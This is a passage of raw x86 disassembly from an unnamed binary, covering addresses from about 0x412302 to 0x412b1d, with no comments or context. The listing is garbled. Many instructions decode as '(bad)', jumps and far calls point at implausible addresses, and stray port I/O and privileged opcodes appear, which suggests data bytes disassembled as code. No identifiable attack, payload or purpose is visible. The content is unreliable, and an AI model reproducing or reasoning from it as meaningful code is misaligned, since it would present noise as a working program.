  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
  4129fd:	add    DWORD PTR [ebp+0x60],0x3d
  412a01:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  412a08:	inc    ebp
  412a09:	dec    DWORD PTR [ebx-0x341ff701]
  412a0f:	test   esi,ecx
  412a11:	dec    DWORD PTR [ebx-0x7f8a3301]
  412a17:	push   eax
  412a18:	add    DWORD PTR [ebp+0x0],eax
  412a1b:	dec    ebx
  412a1d:	or     al,0xce
  412a1f:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  412a26:	into   
  412a27:	add    BYTE PTR [ebx-0x34ff1400],cl
  412a2d:	mov    esi,ecx
  412a2f:	sar    bh,0x45
  412a32:	adc    al,0x8b
  412a34:	clc    
  412a35:	fadd   DWORD PTR [ebp+0x0]
  412a38:	mov    ebp,DWORD PTR [edx+0x8]
  412a3b:	push   edi
  412a3c:	adc    BYTE PTR [eax+0x1],0x83
  412a40:	add    al,al
  412a42:	retf   
  412a43:	mov    ecx,esi
  412a45:	cld    
  412a46:	mov    eax,DWORD PTR [eax+0xcb01cc]
  412a4c:	into   
  412a4d:	add    BYTE PTR [ebx+0x756aec00],cl
  412a53:	jne    0x412a88
  412a55:	inc    DWORD PTR [ebx]
  412a57:	rcl    BYTE PTR [ecx+0x50],1
  412a5a:	push   eax
  412a5b:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  412a61:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  412a68:	sar    bh,0x84
  412a6b:	or     BYTE PTR [ebx],al
  412a6d:	push   eax
  412a6e:	add    BYTE PTR [ebx+0x4532c845],cl
  412a74:	pushf  
  412a75:	xor    edi,eax
  412a77:	pushf  
  412a78:	mov    ah,0x89
  412a7a:	test   eax,ebp
  412a7c:	clc    
  412a7d:	inc    ebp
  412a7e:	inc    ebp
  412a7f:	mov    DWORD PTR [eax+eax*8],esi
  412a82:	sub    al,0x30
  412a84:	mov    BYTE PTR [ebx+ecx*4+0x55d8ec89],bl
  412a8b:	dec    ebp
  412a8c:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a90:	mov    ecx,DWORD PTR [ecx+0x4d55f4b4]
  412a96:	xor    eax,DWORD PTR fs:[edi+0x3]
  412a9a:	or     DWORD PTR [ecx+0x45ff085c],0x0
  412aa1:	shl    DWORD PTR [ebp-0x380064],1
  412aa7:	int3   
  412aa8:	lea    eax,[ebp+0x45fff860]
  412aae:	push   eax
  412aaf:	xor    dh,BYTE PTR [ebp-0x64]
  412ab2:	(bad)  
  412ab3:	(bad)  
  412ab4:	pop    esp
  412ab5:	lods   al,BYTE PTR ds:[esi]
  412ab6:	inc    DWORD PTR [ebp+0x4508f8ff]
  412abc:	mov    edi,DWORD PTR [eax+edx*8]
  412abf:	pushf  
  412ac0:	jo     0x412a89
  412ac2:	cmp    DWORD PTR [eax-0x7a87af0],0x46
  412ac9:	inc    ebp
  412aca:	add    BYTE PTR [esi],bh
  412acc:	push   0x8b809c
  412ad1:	in     al,dx
  412ad2:	inc    ebp
  412ad3:	push   ebp
  412ad4:	mov    esi,DWORD PTR [ebx]
  412ad6:	cld    
  412ad7:	add    eax,DWORD PTR [eax+0xf013b]
  412add:	adc    al,0x0
  412adf:	add    bh,bh
  412ae1:	jmp    0xbe2bfe
  412ae6:	add    BYTE PTR [ebp+0x45],cl
  412ae9:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  412aef:	dec    ebp
  412af0:	push   0x38033
  412af5:	cmp    eax,DWORD PTR [eax]
  412af7:	unpcklps xmm7,xmm0
  412afa:	jne    0x412afc
  412afc:	dec    DWORD PTR [ebx+0x5545cc18]
  412b02:	mov    DWORD PTR [ebx],esi
  412b04:	shl    BYTE PTR [ebx],1
  412b06:	inc    ebp
  412b07:	add    ecx,DWORD PTR [ecx+0x60fc803]
  412b0d:	retf   0x5575
  412b10:	dec    DWORD PTR [ebx-0x5ba17e8]
  412b16:	(bad)  
  412b17:	stc    
  412b18:	in     al,dx
  412b19:	or     al,0x85
  412b1b:	dec    ebp
  412b1c:	clc    
  412b1d:	xor    eax,DWORD PTR [ebp+0x3]
